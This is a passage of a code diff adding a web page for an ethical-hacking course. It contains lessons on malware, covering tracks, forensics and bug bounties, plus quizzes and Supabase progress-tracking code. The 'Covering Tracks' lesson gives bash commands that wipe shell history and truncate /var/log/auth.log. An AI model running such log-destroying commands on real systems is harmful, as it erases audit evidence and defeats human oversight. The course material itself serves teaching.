+                    "<p>A RAT is a type of Trojan that provides the attacker with complete remote administrative control over the victim's computer. The attacker can do almost anything, including accessing files, turning on the webcam and microphone, logging keystrokes, and installing other malware.</p>",
+                },
+              ],
+              codeExamples: [],
+            },
+            quiz: {
+              passingScore: 80,
+              questions: [
+                {
+                  id: 1,
+                  question:
+                    "What type of malware can spread to other computers on its own, without any human interaction?",
+                  options: ["Virus", "Trojan", "Worm", "Adware"],
+                  correct: 2,
+                  explanation:
+                    "The key characteristic of a worm is its ability to self-replicate and propagate across networks automatically.",
+                },
+                {
+                  id: 2,
+                  question:
+                    "Malware that encrypts your files and demands a payment to restore them is known as...",
+                  options: ["Spyware", "Ransomware", "A worm", "A RAT"],
+                  correct: 1,
+                  explanation:
+                    "Ransomware holds a user's data hostage by encrypting it and demanding a ransom for its release.",
+                },
+                {
+                  id: 3,
+                  question:
+                    "A program that appears to be a legitimate game but secretly installs a keylogger is an example of a...",
+                  options: ["Virus", "Worm", "Trojan Horse", "Rootkit"],
+                  correct: 2,
+                  explanation:
+                    "A Trojan Horse deceives the user about its true intent, appearing harmless while carrying a malicious payload.",
+                },
+              ],
+            },
+          },
+          {
+            id: "lesson-17",
+            title: "Covering Tracks",
+            duration: "60 min",
+            objectives: [
+              "Understand why attackers remove evidence of their presence",
+              "Learn about techniques for clearing logs and command history",
+              "Grasp the concept of a rootkit",
+            ],
+            content: {
+              overview:
+                "After successfully compromising a system, attackers want to maintain access and avoid detection. This involves 'covering their tracks' by removing evidence of their activities. This lesson covers the common techniques used in this final phase of an attack.",
+              sections: [
+                {
+                  title: "Removing Evidence",
+                  content:
+                    "<p>Attackers need to clear evidence to prevent system administrators and forensic investigators from discovering how they got in and what they did.</p><h3>Common Techniques:</h3><ul><li><strong>Clearing Command History:</strong> Deleting the <code>.bash_history</code> file or using commands like <code>history -c</code>.</li><li><strong>Log Tampering:</strong> Selectively editing or completely wiping system logs (e.g., <code>/var/log/auth.log</code> on Linux or the Windows Event Viewer logs) to remove traces of logins and other malicious activities.</li><li><strong>File Deletion:</strong> Using secure file deletion utilities to overwrite data, making it unrecoverable.</li></ul>",
+                },
+                {
+                  title: "Maintaining Persistence with Rootkits",
+                  content:
+                    "<p>A rootkit is a collection of software tools, typically malicious, that enables an administrator-level access to a computer or network. A key feature of a rootkit is that it actively hides its presence. It might modify core system files to hide processes, files, and network connections from the user and the operating system itself, making it very difficult to detect.</p>",
+                },
+              ],
+              codeExamples: [
+                {
+                  title: "Linux Commands to Cover Tracks",
+                  language: "bash",
+                  code: "# Clear the current session's history\nhistory -c\n\n# Overwrite and delete the history file\nshred -zu ~/.bash_history\n\n# A simplistic way to clear a log file (will be suspicious)\ncat /dev/null > /var/log/auth.log\n\n# Set an environment variable to prevent history from being saved\nexport HISTSIZE=0",
+                },
+              ],
+            },
+            quiz: {
+              passingScore: 80,
+              questions: [
+                {
+                  id: 1,
+                  question:
+                    "What is the primary reason an attacker would want to cover their tracks?",
+                  options: [
+                    "To make the system run faster",
+                    "To avoid detection and maintain access",
+                    "To free up disk space",
+                    "To test the system's logging capabilities",
+                  ],
+                  correct: 1,
+                  explanation:
+                    "Covering tracks is all about remaining undetected, which allows an attacker to maintain persistent access and makes it harder for investigators to respond.",
+                },
+                {
+                  id: 2,
+                  question:
+                    "A type of malware specifically designed to hide its own presence and the attacker's activities is called a...",
+                  options: ["Worm", "Trojan", "Rootkit", "Virus"],
+                  correct: 2,
+                  explanation:
+                    "A rootkit's main purpose is to conceal its existence and other malicious processes, files, or data on the system.",
+                },
+                {
+                  id: 3,
+                  question:
+                    "Which of the following is a common technique for covering tracks on a Linux system?",
+                  options: [
+                    "Installing more software",
+                    "Running a port scan",
+                    "Clearing the .bash_history file",
+                    "Increasing the log file size",
+                  ],
+                  correct: 2,
+                  explanation:
+                    "The .bash_history file contains a record of the commands an attacker has typed, making it a primary target for deletion.",
+                },
+              ],
+            },
+          },
+          {
+            id: "lesson-18",
+            title: "Digital Forensics Basics",
+            duration: "60 min",
+            objectives: [
+              "Understand the goal of digital forensics",
+              "Learn about the importance of preserving evidence",
+              "Grasp the concept of the chain of custody",
+            ],
+            content: {
+              overview:
+                "Digital forensics is the process of identifying, preserving, analyzing, and documenting digital evidence for use in legal cases. As an ethical hacker, understanding forensic principles is vital for proper incident response and reporting.",
+              sections: [
+                {
+                  title: "Preserving Evidence",
+                  content:
+                    "<p>The first rule of digital forensics is to preserve the integrity of the original evidence. Interacting with a live system can alter data, timestamps, and memory contents. Therefore, a forensic investigator will typically create a bit-for-bit copy (a forensic image) of the storage media. All analysis is performed on this copy, not the original.</p>",
+                },
+                {
+                  title: "Chain of Custody",
+                  content:
+                    "<p>The chain of custody is a chronological documentation trail showing the seizure, custody, control, transfer, analysis, and disposition of physical or electronic evidence. It is crucial for proving in court that the evidence has not been tampered with. Every person who handles the evidence must be documented.</p>",
+                },
+                {
+                  title: "Order of Volatility",
+                  content:
+                    "<p>When collecting evidence from a live system, it must be collected in order of volatility—from most volatile to least volatile.</p><ol><li>CPU registers, cache</li><li>Routing tables, ARP cache, memory (RAM)</li><li>Temporary system files</li><li>Data on hard disks</li><li>Archived media and backups</li></ol>",
+                },
+              ],
+              codeExamples: [
+                {
+                  title: "Creating a Forensic Image with 'dd'",
+                  language: "bash",
+                  code: "# dd is a powerful tool for creating bit-for-bit copies.\n# This command copies the entire drive /dev/sda to an image file on an external drive.\n# WARNING: A mistake here can wipe your data. For demonstration only.\n\n# sudo dd if=/dev/sda of=/mnt/external_drive/image.img bs=4k conv=noerror,sync",
+                },
+              ],
+            },
+            quiz: {
+              passingScore: 80,
+              questions: [
+                {
+                  id: 1,
+                  question:
+                    "Why do forensic investigators work on a copy of a hard drive instead of the original?",
+                  options: [
+                    "It is faster",
+                    "To preserve the integrity of the original evidence",
+                    "The original drive is encrypted",
+                    "Copies are easier to read",
+                  ],
+                  correct: 1,
+                  explanation:
+                    "The cardinal rule of digital forensics is to do no harm. Working on a bit-for-bit copy ensures the original evidence remains pristine and unaltered.",
+                },
+                {
+                  id: 2,
+                  question:
+                    "The meticulous documentation of who handled a piece of evidence and when is known as the...",
+                  options: [
+                    "Order of Volatility",
+                    "Chain of Custody",
+                    "Forensic Log",
+                    "Evidence Trail",
+                  ],
+                  correct: 1,
+                  explanation:
+                    "The Chain of Custody is a legal document that provides a detailed log of the evidence's lifecycle to prove its integrity.",
+                },
+                {
+                  id: 3,
+                  question:
+                    "According to the order of volatility, which of the following should be collected first?",
+                  options: [
+                    "Files on the hard drive",
+                    "Data in RAM",
+                    "Archived backups",
+                    "Temporary files",
+                  ],
+                  correct: 1,
+                  explanation:
+                    "Data in RAM is highly volatile and will be lost when the computer is powered off, so it must be collected before less volatile evidence like data on a hard drive.",
+                },
+              ],
+            },
+          },
+          {
+            id: "lesson-19",
+            title: "Bug Bounty & Responsible Disclosure",
+            duration: "60 min",
+            objectives: [
+              "Understand the concept of bug bounty programs",
+              "Learn about major bug bounty platforms like HackerOne and Bugcrowd",
+              "Grasp the principles of responsible disclosure",
+            ],
+            content: {
+              overview:
+                "The skills of an ethical hacker are in high demand, not just for penetration testing jobs, but also in the world of bug bounties. This lesson explores how you can legally hack companies and get paid for it.",
+              sections: [
+                {
+                  title: "Bug Bounty Programs",
+                  content:
+                    "<p>A bug bounty program is a deal offered by many websites, organizations, and software developers by which individuals can receive recognition and compensation for reporting bugs, especially those pertaining to security exploits and vulnerabilities. It allows companies to leverage a massive community of hackers to find vulnerabilities before malicious actors do.</p>",
+                },
+                {
+                  title: "Major Platforms",
+                  content:
+                    "<p>While some companies run their own programs (e.g., Google, Facebook), many use third-party platforms to manage their bug bounty programs.</p><ul><li><strong>HackerOne:</strong> One of the largest and most popular platforms, connecting companies with a global community of security researchers.</li><li><strong>Bugcrowd:</strong> Another major player that offers bug bounty, vulnerability disclosure, and penetration testing services.</li><li><strong>Synack:</strong> A more exclusive, private platform that uses a team of vetted researchers.</li></ul>",
+                },
+                {
+                  title: "Responsible Disclosure",
+                  content:
+                    "<p>Responsible disclosure is a vulnerability disclosure model where a researcher who finds a vulnerability privately informs the vendor and allows them a reasonable amount of time to fix the issue before disclosing it publicly. This is the core ethical principle behind bug bounty programs. It protects users by giving the company time to patch the vulnerability before it is widely known.</p>",
+                },
+              ],
+              codeExamples: [],
+            },
+            quiz: {
+              passingScore: 80,
+              questions: [
+                {
+                  id: 1,
+                  question: "What is a bug bounty program?",
+                  options: [
+                    "A type of malware",
+                    "A government surveillance program",
+                    "A program where companies pay researchers for finding vulnerabilities",
+                    "A competition to see who can write the most bugs",
+                  ],
+                  correct: 2,
+                  explanation:
+                    "Bug bounty programs are a way for companies to crowdsource vulnerability discovery by rewarding ethical hackers for their findings.",
+                },
+                {
+                  id: 2,
+                  question: "HackerOne and Bugcrowd are examples of...",
+                  options: [
+                    "Hacking tools",
+                    "Malware families",
+                    "Government agencies",
+                    "Bug bounty platforms",
+                  ],
+                  correct: 3,
+                  explanation:
+                    "HackerOne and Bugcrowd are platforms that connect companies with security researchers and manage bug bounty programs.",
+                },
+                {
+                  id: 3,
+                  question:
+                    "What is the core principle of 'responsible disclosure'?",
+                  options: [
+                    "Disclosing the vulnerability publicly immediately",
+                    "Selling the vulnerability to the highest bidder",
+                    "Privately reporting the vulnerability to the vendor and giving them time to fix it",
+                    "Ignoring the vulnerability",
+                  ],
+                  correct: 2,
+                  explanation:
+                    "Responsible disclosure prioritizes user safety by giving the company a chance to fix the issue before it is made public.",
+                },
+              ],
+            },
+          },
+          {
+            id: "lesson-20",
+            title: "Final Hacking Project",
+            duration: "120 min",
+            objectives: [
+              "Set up a safe virtual penetration testing lab",
+              "Conduct a simulated penetration test from start to finish",
+              "Practice writing a professional penetration test report",
+            ],
+            content: {
+              overview:
+                "This final lesson brings everything together. You will set up your own virtual lab environment and conduct a full penetration test against an intentionally vulnerable machine, applying the skills you've learned throughout the course.",
+              sections: [
+                {
+                  title: "Setting Up Your Lab",
+                  content:
+                    '<p>A safe lab is crucial for practicing hacking skills legally and safely. It isolates your activities from your main network.</p><h3>Required Components:</h3><ul><li><strong>Virtualization Software:</strong> VirtualBox (free) or VMware.</li><li><strong>Attacker Machine:</strong> Kali Linux is the standard, as it comes pre-loaded with all the necessary tools.</li><li><strong>Target Machine:</strong> An intentionally vulnerable virtual machine. Good options for beginners include Metasploitable2, DVWA (Damn Vulnerable Web Application), or VMs from VulnHub.</li></ul><div class="info-box warning"><div class="info-box-header"><i class="fas fa-exclamation-triangle"></i><strong>Network Configuration</strong></div><p>Ensure your VMs are on an isolated network configuration (like a Host-only or NAT Network) so they can communicate with each other but are isolated from your main network and the internet.</p></div>',
+                },
+                {
+                  title: "The Simulation",
+                  content:
+                    "<p>You will perform a full penetration test against your target machine, following the phases learned in this course:</p><ol><li><strong>Reconnaissance & Scanning:</strong> Use Nmap to discover open ports and services on the target.</li><li><strong>Enumeration:</strong> Dig deeper into the discovered services.</li><li><strong>Gaining Access:</strong> Find a vulnerability and use Metasploit or another tool to exploit it and get a shell.</li><li><strong>Privilege Escalation:</strong> Once you have a user shell, find a way to become root.</li></ol>",
+                },
+                {
+                  title: "The Report",
+                  content:
+                    "<p>The final and most important deliverable of a professional penetration test is the report. Your report should include:</p><ul><li><strong>Executive Summary:</strong> A high-level overview for management.</li><li><strong>Scope and Objectives:</strong> What was tested.</li><li><strong>Findings:</strong> A detailed, technical description of each vulnerability found, including its risk rating (e.g., Critical, High, Medium, Low).</li><li><strong>Proof of Concept:</strong> Step-by-step instructions on how to reproduce the vulnerability.</li><li><strong>Remediation:</strong> Recommendations on how to fix each vulnerability.</li></ul>",
+                },
+              ],
+              codeExamples: [],
+            },
+            quiz: {
+              passingScore: 80,
+              questions: [
+                {
+                  id: 1,
+                  question:
+                    "What is the primary purpose of setting up a virtual lab for hacking practice?",
+                  options: [
+                    "To make attacks run faster",
+                    "To practice legally and safely in an isolated environment",
+                    "To get free software",
+                    "To attack real websites",
+                  ],
+                  correct: 1,
+                  explanation:
+                    "A virtual lab creates an isolated sandbox where you can safely and legally practice using hacking tools without affecting your own network or breaking the law.",
+                },
+                {
+                  id: 2,
+                  question:
+                    "Which of the following is a popular Linux distribution specifically designed for penetration testing?",
+                  options: ["Ubuntu", "Windows Server", "Kali Linux", "CentOS"],
+                  correct: 2,
+                  explanation:
+                    "Kali Linux is the industry standard for penetration testing, as it comes with hundreds of pre-installed security tools.",
+                },
+                {
+                  id: 3,
+                  question:
+                    "In a professional penetration test report, which section provides a high-level overview for non-technical management?",
+                  options: [
+                    "Proof of Concept",
+                    "Findings",
+                    "Executive Summary",
+                    "Remediation",
+                  ],
+                  correct: 2,
+                  explanation:
+                    "The Executive Summary is written in plain language and summarizes the overall security posture and most critical findings for a management audience.",
+                },
+              ],
+            },
+          },
+        ],
+      };
+      // =====================================================
+      // GLOBAL VARIABLES
+      // =====================================================
+      let currentUser = null;
+      let currentLessonIndex = 0;
+      let courseProgress = {};
+      let userStats = {};
+      let quizState = {
+        currentQuestion: 0,
+        answers: [],
+        score: 0,
+        isComplete: false,
+      };
+
+      // Enhanced session tracking
+      let courseSession = {
+        startTime: null,
+        totalStudyTime: 0,
+        lessonsStarted: 0,
+        lessonsCompleted: 0,
+        pageLoadTime: new Date(),
+        interactionCount: 0,
+        lastActivityTime: new Date(),
+      };
+
+      // Music Player Variables
+      let audioPlayer = new Audio();
+
+      // Achievement notification system
+      let notificationQueue = [];
+      let isShowingNotification = false;
+
+      // =====================================================
+      // INITIALIZATION
+      // =====================================================
+      document.addEventListener("DOMContentLoaded", async () => {
+        try {
+          showLoadingScreen();
+          await checkAuth();
+
+          if (currentUser) {
+            // Initialize session tracking
+            startCourseSession();
+
+            // Load course data and progress
+            await loadCourseData();
+            await loadUserProfile();
+            await loadProgress();
+
+            // Initialize UI
+            initializeEventListeners();
+            renderSidebar();
+            loadLesson(currentLessonIndex);
+
+            // Initialize additional features
+            initMusicPlayer();
+            addMusicIndicator();
+            initializeActivityTracking();
+
+            hideLoadingScreen();
+          } else {
+            openAuthModal();
+          }
+        } catch (error) {
+          console.error("Error initializing course:", error);
+          hideLoadingScreen();
+          showToast("Failed to initialize course system", "error");
+        }
+      });
+
+      // =====================================================
+      // AUTHENTICATION SYSTEM
+      // =====================================================
+      async function checkAuth() {
+        try {
+          const {
+            data: { session },
+            error,
+          } = await supabase.auth.getSession();
+
+          if (error) {
+            console.error("Auth error:", error);
+            currentUser = null;
+            openAuthModal();
+            return;
+          }
+
+          if (!session) {
+            currentUser = null;
+            openAuthModal();
+            return;
+          }
+
+          currentUser = session.user;
+          updateUIWithUser();
+        } catch (error) {
+          console.error("Error checking auth:", error);
+          currentUser = null;
+          openAuthModal();
+        }
+      }
+
+      function updateUIWithUser() {
+        if (!currentUser) return;
+
+        const name =
+          currentUser.user_metadata?.full_name ||
+          currentUser.email.split("@")[0];
+        const userElements = document.querySelectorAll("[data-user-name]");
+        userElements.forEach((el) => (el.textContent = name));
+      }
+
+      // =====================================================
+      // USER PROFILE & STATS MANAGEMENT
+      // =====================================================
+      async function loadUserProfile() {
+        try {
+          // 🔍 Step 1: Try to fetch existing profile
+          const { data: profile, error } = await supabase
+            .from("profiles")
+            .select("*")
+            .eq("id", currentUser.id)
+            .single();
+
+          if (error && error.code !== "PGRST116") {
+            throw error;
+          }
+
+          if (!profile) {
+            // 🆕 Step 2: Create new profile if missing
+            await createUserProfile();
+          } else {
+            // ✅ Step 3: Use existing profile
+            userStats = profile;
+            await updateLastActivity();
+          }
+        } catch (error) {
+          console.error("❌ Error loading user profile:", error);
+          showToast("Failed to load user profile", "error");
+        }
+      }
+      async function createUserProfile() {
+        try {
+          const newProfile = {
+            id: currentUser.id,
+            full_name: currentUser.user_metadata?.full_name || "",
+            email: currentUser.email,
+            level: "Script Kiddie",
+            total_points: 0,
+            completed_courses: 0,
+            current_streak: 0,
+            total_certificates: 0,
+            total_achievements: 0,
+            sections_visited: 0,
+            bonus_points: 0,
+            in_progress_courses: 0,
+            settings_changed: 0,
+            midnight_sessions: 0,
+            early_sessions: 0,
+            weekend_sessions: 0,
+            last_activity: new Date().toISOString(),
+            created_at: new Date().toISOString(),
+          };
+
+          const { error } = await supabase
+            .from("profiles")
+            .insert([newProfile]);
+
+          if (!error) {
+            userStats = newProfile;
+            // Award first login achievement
+            setTimeout(() => checkAndUnlockAchievement("first_login"), 1000);
+          }
+        } catch (error) {
+          console.error("Error creating user profile:", error);
+        }
+      }
+
+      async function updateLastActivity() {
+        try {
+          const now = new Date();
+
+          // Update activity tracking
+          courseSession.lastActivityTime = now;
+
+          // Update database
+          await supabase
+            .from("profiles")
+            .update({
+              last_activity: now.toISOString(),
+            })
+            .eq("id", currentUser.id);
+
+          // Check time-based achievements
+          await checkTimeBasedAchievements(now);
+        } catch (error) {
+          console.error("Error updating last activity:", error);
+        }
+      }
+
+      // =====================================================
+      // COURSE SESSION MANAGEMENT
+      // =====================================================
+      function startCourseSession() {
+        courseSession.startTime = new Date();
+        courseSession.pageLoadTime = new Date();
+
+        logUserActivity("course_session_start", {
+          course_id: COURSE_DATA.id,
+          course_title: COURSE_DATA.title,
+          user_agent: navigator.userAgent,
+          screen_resolution: `${screen.width}x${screen.height}`,
+        });
+
+        // Check daily streak
+        checkDailyStreak();
+      }
+
+      function initializeActivityTracking() {
+        // Track page focus/blur for accurate study time
+        document.addEventListener("visibilitychange", handleVisibilityChange);
+
+        // Track user interactions
+        ["click", "keydown", "scroll", "mousemove"].forEach((event) => {
+          document.addEventListener(event, trackUserInteraction, {
+            passive: true,
+          });
+        });
+
+        // Periodic activity updates
+        setInterval(updateStudyTime, 60000); // Every minute
+
+        // Save session data before page unload
+        window.addEventListener("beforeunload", saveSessionData);
+      }
+
+      function handleVisibilityChange() {
+        if (document.hidden) {
+          courseSession.lastActivityTime = new Date();
+        } else {
+          // Page became visible again - update activity
+          updateLastActivity();
+        }
+      }
+
+      function trackUserInteraction() {
+        courseSession.interactionCount++;
+        courseSession.lastActivityTime = new Date();
+
+        // Throttle activity updates
+        if (courseSession.interactionCount % 50 === 0) {
+          updateLastActivity();
+        }
+      }
+
+      function updateStudyTime() {
+        if (!courseSession.startTime || document.hidden) return;
+
+        const now = new Date();
+        const sessionDuration = now - courseSession.startTime;
+        courseSession.totalStudyTime = Math.floor(sessionDuration / 1000 / 60); // in minutes
+
+        // Update progress with study time
+        saveProgress();
+      }
+
+      function saveSessionData() {
+        if (!currentUser || !courseSession.startTime) return;
+
+        const sessionData = {
+          user_id: currentUser.id,
+          course_id: COURSE_DATA.id,
+          session_duration: courseSession.totalStudyTime,
+          lessons_viewed: courseSession.lessonsStarted,
+          lessons_completed: courseSession.lessonsCompleted,
+          interactions: courseSession.interactionCount,
+          session_date: courseSession.startTime.toISOString().split("T")[0],
+        };
+
+        // Store in localStorage as backup
+        localStorage.setItem(
+          "course_session_backup",
+          JSON.stringify(sessionData)
+        );
+
+        // Try to save to database
+        logUserActivity("course_session_end", sessionData);
+      }
+
+      // =====================================================
+      // COURSE DATA & PROGRESS MANAGEMENT
+      // =====================================================
+      async function loadCourseData() {
+        try {
+          // Update course info in UI
+          document.getElementById("courseTitle").textContent =
+            COURSE_DATA.title;
+          document.getElementById("totalLessons").textContent =
+            COURSE_DATA.lessons.length;
+
+          // Log course access
+          logUserActivity("course_access", {
+            course_id: COURSE_DATA.id,
+            course_title: COURSE_DATA.title,
+          });
+        } catch (error) {
+          console.error("Error loading course data:", error);
+        }
+      }
+
+      async function loadProgress() {
+        try {
+          // Get existing progress from database
+          const { data, error } = await supabase
+            .from("course_progress")
+            .select("*")
+            .eq("user_id", currentUser.id)
+            .eq("course_id", COURSE_DATA.id)
+            .single();
+
+          if (error && error.code !== "PGRST116") {
+            throw error;
+          }
+
+          if (data) {
+            courseProgress = JSON.parse(data.lesson_progress || "{}");
+            currentLessonIndex = data.current_lesson || 0;
+
+            // Update session tracking
+            courseSession.lessonsStarted = Object.keys(courseProgress).length;
+            courseSession.lessonsCompleted = Object.values(
+              courseProgress
+            ).filter((p) => p.completed).length;
+          } else {
+            // Initialize new progress
+            courseProgress = {};
+            currentLessonIndex = 0;
+            await saveProgress();
+
+            // Award first course start achievement
+            await checkAndUnlockAchievement("first_course_start");
+          }
+
+          updateProgressDisplay();
+        } catch (error) {
+          console.error("Error loading progress:", error);
+          showToast("Failed to load progress", "error");
+        }
+      }
+
+      async function saveProgress() {
+        try {
+          if (!currentUser) return;
+
+          const now = new Date();
+          const progressData = {
+            user_id: currentUser.id,
+            course_id: COURSE_DATA.id,
+            course_title: COURSE_DATA.title,
+            current_lesson: currentLessonIndex,
+            lesson_progress: JSON.stringify(courseProgress),
+            progress: calculateOverallProgress(),
+            lessons_completed: getCompletedLessonsCount(),
+            lessons_started: Object.keys(courseProgress).length,
+            study_time_minutes: courseSession.totalStudyTime,
+            last_accessed: now.toISOString(),
+            updated_at: now.toISOString(),
+          };
+
+          // Upsert progress
+          const { error } = await supabase
+            .from("course_progress")
+            .upsert([progressData]);
+
+          if (error) throw error;
+
+          // Update user stats
+          await updateUserStats();
+
+          updateProgressDisplay();
+        } catch (error) {
+          console.error("Error saving progress:", error);
+          showToast("Failed to save progress", "error");
+        }
+      }
+
+      async function updateUserStats() {
+        try {
+          // Get all course progress for this user
+          const { data: allProgress, error } = await supabase
+            .from("course_progress")
+            .select("progress, course_id, study_time_minutes")
+            .eq("user_id", currentUser.id);
+
+          if (error) throw error;
+
+          // Calculate stats
+          const completedCourses =
+            allProgress?.filter((p) => p.progress >= 100).length || 0;
+          const inProgressCourses =
+            allProgress?.filter((p) => p.progress > 0 && p.progress < 100)
+              .length || 0;
+          const totalStudyTime =
+            allProgress?.reduce(
+              (sum, p) => sum + (p.study_time_minutes || 0),
+              0
+            ) || 0;
+
+          // Calculate points (500 per completed course + achievement points)
+          const coursePoints = completedCourses * 500;
+          const bonusPoints = userStats.bonus_points || 0;
+          const totalPoints = coursePoints + bonusPoints;
+
+          // Update profile
+          const updateData = {
+            completed_courses: completedCourses,
+            in_progress_courses: inProgressCourses,
+            total_points: totalPoints,
+            total_study_time: totalStudyTime,
+            last_activity: new Date().toISOString(),
+          };
+
+          const { error: updateError } = await supabase
+            .from("profiles")
+            .update(updateData)
+            .eq("id", currentUser.id);
+
+          if (updateError) throw updateError;
+
+          // Update local stats
+          Object.assign(userStats, updateData);
+        } catch (error) {
+          console.error("Error updating user stats:", error);
+        }
+      }
+
+      function calculateOverallProgress() {
+        const completedLessons = getCompletedLessonsCount();
+        return Math.round(
+          (completedLessons / COURSE_DATA.lessons.length) * 100
+        );
+      }
+
+      function getCompletedLessonsCount() {
+        return Object.values(courseProgress).filter(
+          (lesson) => lesson.completed
+        ).length;
+      }
+
+      function updateProgressDisplay() {
+        const completedCount = getCompletedLessonsCount();
+        const progressPercent = calculateOverallProgress();
+
+        // Update UI elements
+        const elements = {
+          completedLessons: completedCount,
+          courseProgressPercent: `${progressPercent}%`,
+        };
+
+        Object.entries(elements).forEach(([id, value]) => {
+          const element = document.getElementById(id);
+          if (element) element.textContent = value;
+        });
+
+        // Update progress bar
+        const progressBar = document.getElementById("courseProgressFill");
+        if (progressBar) progressBar.style.width = `${progressPercent}%`;
+      }
+
+      // =====================================================
+      // LESSON MANAGEMENT
+      // =====================================================
+      function loadLesson(index) {
+        if (index < 0 || index >= COURSE_DATA.lessons.length) return;
+
+        const lesson = COURSE_DATA.lessons[index];
+        currentLessonIndex = index;
+
+        // Mark lesson as started and track activity
+        if (!courseProgress[lesson.id]) {
+          courseProgress[lesson.id] = {
+            started: true,
+            completed: false,
+            startedAt: new Date().toISOString(),
+            timeSpent: 0,
+          };
+
+          courseSession.lessonsStarted++;
+          saveProgress();
+
+          // Log lesson start
+          logUserActivity("lesson_start", {
+            lesson_id: lesson.id,
+            lesson_title: lesson.title,
+            lesson_index: index,
+          });
+        }
+
+        // Update lesson start time for time tracking
+        courseProgress[lesson.id].currentSessionStart = new Date();
+
+        // Update sidebar and navigation
+        renderSidebar();
+        updateNavigationButtons();
+
+        // Update header info
+        updateLessonHeader(lesson, index);
+
+        // Render lesson content
+        renderLessonContent(lesson);
+
+        // Smooth scroll and animations
+        window.scrollTo({ top: 0, behavior: "smooth" });
+        document.getElementById("contentBody").scrollTop = 0;
+
+        const contentBody = document.getElementById("contentBody");
+        contentBody.classList.add("fade-in");
+        setTimeout(() => contentBody.classList.remove("fade-in"), 500);
+
+        // Check lesson-based achievements
+        checkLessonAchievements(index + 1);
+      }
+
+      function updateLessonHeader(lesson, index) {
+        const elements = {
+          currentLessonNumber: index + 1,
+          currentLessonTitle: lesson.title,
+          navInfo: `Lesson ${index + 1} of ${COURSE_DATA.lessons.length}`,
+        };
+
+        Object.entries(elements).forEach(([id, value]) => {
+          const element = document.getElementById(id);
+          if (element) element.textContent = value;
+        });
+      }
+
+      function renderSidebar() {
+        const lessonNav = document.getElementById("lessonNav");
+        if (!lessonNav) return;
+
+        lessonNav.innerHTML = "";
+
+        COURSE_DATA.lessons.forEach((lesson, index) => {
+          const lessonItem = document.createElement("div");
+          lessonItem.className = "lesson-item";
+
+          // Determine lesson status
+          const lessonProgress = courseProgress[lesson.id];
+          const isCompleted = lessonProgress?.completed || false;
+          const isInProgress = lessonProgress?.started || false;
+          const isLocked = !isCompleted && !canAccessLesson(index);
+          const isActive = index === currentLessonIndex;
+
+          // Apply status classes
+          if (isCompleted) lessonItem.classList.add("completed");
+          if (isLocked) lessonItem.classList.add("locked");
+          if (isActive) lessonItem.classList.add("active");
+
+          // Determine status display
+          let statusClass = "not-started";
+          let statusIcon = index + 1;
+
+          if (isCompleted) {
+            statusClass = "completed";
+            statusIcon = "✓";
+          } else if (isInProgress) {
+            statusClass = "in-progress";
+            statusIcon = "◐";
+          }
+
+          // Create lesson item HTML
+          lessonItem.innerHTML = `
+            <div class="lesson-status ${statusClass}">${statusIcon}</div>
+            <div class="lesson-info">
+                <div class="lesson-title">${lesson.title}</div>
+                <div class="lesson-meta">
+                    ${
+                      isCompleted
+                        ? "Completed"
+                        : isInProgress
+                        ? "In Progress"
+                        : isLocked
+                        ? "Locked"
+                        : "Not Started"
+                    }
+                </div>
+            </div>
+            <div class="lesson-duration">${lesson.duration}</div>
+        `;
+
+          // Add click handler if not locked
+          if (!isLocked) {
+            lessonItem.addEventListener("click", () => {
+              if (index !== currentLessonIndex) {
+                // Track lesson time before switching
+                trackLessonTime();
+
+                currentLessonIndex = index;
+                loadLesson(index);
+                closeSidebar();
+              }
+            });
+          }
+
+          lessonNav.appendChild(lessonItem);
+        });
+      }
+
+      function canAccessLesson(index) {
+        if (index === 0) return true; // First lesson always accessible
+
+        // Can access if previous lesson is completed
+        const previousLessonId = COURSE_DATA.lessons[index - 1].id;
+        return courseProgress[previousLessonId]?.completed || false;
+      }
+
+      function trackLessonTime() {
+        const currentLesson = COURSE_DATA.lessons[currentLessonIndex];
+        const lessonProgress = courseProgress[currentLesson.id];
+
+        if (lessonProgress?.currentSessionStart) {
+          const sessionTime = Math.floor(
+            (new Date() - new Date(lessonProgress.currentSessionStart)) /
+              1000 /
+              60
+          );
+          lessonProgress.timeSpent =
+            (lessonProgress.timeSpent || 0) + sessionTime;
+          delete lessonProgress.currentSessionStart;
+        }
+      }
+
+      // =====================================================
+      // LESSON CONTENT RENDERING
+      // =====================================================
+      function renderLessonContent(lesson) {
+        const contentContainer = document.getElementById("lessonContent");
+        if (!contentContainer) return;
+
+        let contentHTML = `
+        <div class="content-section">
+            <h2>Learning Objectives</h2>
+            <ul>
+                ${lesson.objectives.map((obj) => `<li>${obj}</li>`).join("")}
+            </ul>
+        </div>
+        
+        <div class="content-section">
+            <h2>Overview</h2>
+            <p>${lesson.content.overview}</p>
+        </div>
+    `;
+
+        // Render content sections
+        lesson.content.sections.forEach((section) => {
+          contentHTML += `
+            <div class="content-section">
+                <h2>${section.title}</h2>
+                ${section.content}
+                ${
+                  section.image
+                    ? `<img src="${section.image}" alt="${section.title}" class="content-image" loading="lazy">`
+                    : ""
+                }
+            </div>
+        `;
+        });
+
+        // Render code examples
+        if (
+          lesson.content.codeExamples &&
+          lesson.content.codeExamples.length > 0
+        ) {
+          contentHTML += `<div class="content-section"><h2>Code Examples</h2></div>`;
+
+          lesson.content.codeExamples.forEach((example, index) => {
+            const codeId = `code-${lesson.id}-${index}`;
+            contentHTML += `
+                <div class="code-section">
+                    <div class="code-header">
+                        <span class="code-title">${example.title}</span>
+                        <button class="copy-btn" onclick="copyCode('${codeId}')">
+                            <i class="fas fa-copy"></i> Copy
+                        </button>
+                    </div>
+                    <pre class="code-block"><code id="${codeId}" class="language-${
+              example.language
+            }">${escapeHtml(example.code)}</code></pre>
+                </div>
+            `;
+          });
+        }
+
+        // Render quiz
+        contentHTML += renderQuiz(lesson.quiz);
+
+        contentContainer.innerHTML = contentHTML;
+
+        // Highlight code syntax if Prism is available
+        setTimeout(() => {
+          if (window.Prism) {
+            Prism.highlightAll();
+          }
+        }, 100);
+      }
+
+      // =====================================================
+      // QUIZ SYSTEM
+      // =====================================================
+      function renderQuiz(quiz) {
+        const currentLessonProgress =
+          courseProgress[COURSE_DATA.lessons[currentLessonIndex].id];
+        const isCompleted = currentLessonProgress?.completed || false;
+
+        let quizHTML = `
+        <div class="quiz-section" id="quizSection">
+            <div class="quiz-header">
+                <h2 class="quiz-title">
+                    <i class="fas fa-clipboard-check"></i>
+                    Knowledge Check
+                </h2>
+                <p class="quiz-info">
+                    Complete this quiz with ${quiz.passingScore}% or higher to unlock the next lesson.
+                </p>
+            </div>
+    `;
+
+        if (isCompleted) {
+          const savedScore = currentLessonProgress.quizScore || 0;
+          quizHTML += `
+            <div class="quiz-results show">
